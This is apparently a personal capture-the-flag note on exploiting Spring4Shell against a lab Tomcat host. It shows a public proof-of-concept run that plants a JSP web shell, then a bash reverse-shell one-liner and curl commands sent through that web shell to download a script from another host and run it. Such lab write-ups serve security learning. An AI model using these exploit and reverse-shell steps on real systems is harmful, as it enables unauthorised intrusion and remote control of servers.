Basic, Non rootable Machine
Here we need to exploit the Spring4Shell CVE
Links : http://10.0.200.14:8080/helloworld/greeting
I got this helpful : https://github.com/reznok/Spring4Shell-POC

also :
```terminal
┌──(root㉿bloman)-[/home/bloman/CTFs/EchoCTF]
└─# python3 springexploit.py --url http://10.0.200.14:8080/helloworld/greeting
[*] Resetting Log Variables.
[*] Response code: 200
[*] Modifying Log Configurations
[*] Response code: 200
[*] Response Code: 200
[*] Resetting Log Variables.
[*] Response code: 200
[+] Exploit completed
[+] Check your target for a shell
[+] File: shell.jsp
[+] Shell should be at: http://10.0.200.14:8080/shell.jsp?cmd=id


```

worked, now trying to get a reverse shell
`bash -c 'exec bash -i &>/dev/tcp/10.10.14.36/1234 <&1'` into a file shell.sh
Now run : 
`└─$ curl http://10.0.200.14:8080/shell.jsp?cmd=curl%2010.10.5.230%2Fshell.sh%20-o%20%2Ftmp%2Fshell.sh --output -`
then : 
```
┌──(bloman㉿bloman)-[~]
└─$ curl http://10.0.200.14:8080/shell.jsp?cmd=bash%20/tmp/shell.sh         

```
